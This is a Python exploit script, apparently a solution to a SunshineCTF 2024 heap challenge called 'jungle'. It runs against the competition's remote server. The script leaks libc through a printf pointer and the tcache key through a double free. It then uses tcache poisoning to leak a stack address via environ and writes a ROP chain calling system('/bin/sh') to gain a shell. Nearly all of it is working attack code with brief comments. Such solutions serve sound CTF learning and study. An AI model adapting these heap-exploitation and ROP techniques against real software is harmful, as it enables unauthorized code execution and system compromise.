from gdb_plus import *

def remove_item(i):
    io.sendlineafter(b'>>>', b'3')
    io.sendlineafter(b'>>>', f'{i}'.encode())

def read_item_name(i):
    io.sendlineafter(b'>>>', b'1')
    io.sendlineafter(b'>>>', f'{i}'.encode())
    io.recvuntil(b": ")
    res = io.recvuntil(b"\n", drop=True)
    return res

def fill(i):
    io.sendlineafter(b'>>>', b'2')
    io.sendlineafter(b'>>>', f'{i}'.encode())
    io.sendlineafter(b'>>>', cyclic(64))

def put(i, by):
    io.sendlineafter(b'>>>', b'2')
    io.sendlineafter(b'>>>', f'{i}'.encode())
    io.sendlineafter(b'>>>', by)


libc = ELF("./libc.so.6")

dbg = Debugger('./jungle.bin', script='init-gef').remote('2024.sunshinectf.games', 24005)
io = dbg.p

dbg.c(wait=False)

# use the Genie to leak printf
put(1, "Genie")
io.sendlineafter(b'>>>', b'1')
io.sendlineafter(b'>>>', b'1')
io.recvuntil(b": ")
io.recvuntil(b": ")

printf_address = int(io.recvuntil(b"\n", drop=True)[2:].decode(), 16)

libc.address = printf_address - (libc.sym['printf'] - libc.address)
log.info(f'{libc.address = :016x}')

# leak the tcache key
remove_item(1)
remove_item(1) # remove the item 2nd time to mark it as not used to make it possible to read the data from the chunk
tcache_key = read_item_name(1)

# setup for 1st tcache poisoning
remove_item(6)
remove_item(2)
remove_item(3)
remove_item(3)

tcache_int = u64(tcache_key.ljust(8, b'\0'))

aligned_offset = 0x38
r4 = tcache_int ^ (libc.sym['environ'] - aligned_offset) # allocate some bytes away from the actual target to not overwrite it accidentally

put(3, p64(r4)) # poison the fwd pointer
put(6, b"AAAA") # chunk we don't care about
put(2, f"{'B' * (aligned_offset-1)}".encode()) # the actual chunk in libc

read_item_name(2)
stack_leak = io.recvuntil(b"\n", drop=True)
stack_leak_int = u64(stack_leak.ljust(8, b'\0'))

return_address = stack_leak_int - 304 # use gdb to calculate the offset
log.info(f'{return_address = :016x}')

# setup for 2nd tcache poisoning - use some chunks that weren't used before
remove_item(6)
remove_item(5)
remove_item(4)
remove_item(4)

bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']

# find those with ROPgadget
pop_rdi_ret = 0x000000000010f75b + libc.address
ret = 0x000000000002882f + libc.address

ropchain = flat(pop_rdi_ret, bin_sh, ret, system, word_size=64) # the singular `ret` in the middle is necessary to have the stack properly aligned

r5 = tcache_int ^ (return_address - 0x8) # subtract 8 because otherwise the chunk won't be aligned and tcache will be mad

put(4, p64(r5)) # poison the fwd pointer
put(6, b'CCCCC') # some chunk we don't care about
put(5, b'D' * 8 + ropchain) # chunk on the stack

# do nothing interesting for the last few rounds
for i in range(5):
    read_item_name(1)

io.interactive() # :)